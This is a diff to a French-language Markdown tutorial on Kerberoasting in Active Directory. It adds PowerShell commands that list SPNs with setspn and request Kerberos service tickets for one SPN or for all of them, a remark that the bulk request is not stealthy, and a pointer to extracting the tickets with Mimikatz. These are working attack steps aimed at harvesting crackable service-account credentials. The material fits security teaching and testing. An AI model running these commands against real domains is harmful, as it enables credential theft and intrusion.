@@ -23,18 +23,27 @@ public: true # set to true to make the article publishable
 setspn.exe -q */*
 ```
 
+###### Demande d'un TGS
+
 ```powershell
 # Demander un TGS pour le SPN désiré (compte utilisateur)
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MyUSERWithSPN/srvtest.domain.local"
 ```
 
+###### Demander tous les TGS existants
+
+Attention, cela ne sera pas du tout furtif !
 
 ```powershell
 # Demander tous les TGS possibles
 Add-Type -AssemblyName System.IdentityModel
 setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
+
+##### Extraire le ou les Tickets (TGS)
+
+Une fois les TGS générés par le KDC et stockés dans le système d'exploitation, on peut les récupérer via `Mimikatz`. 
 
 
 
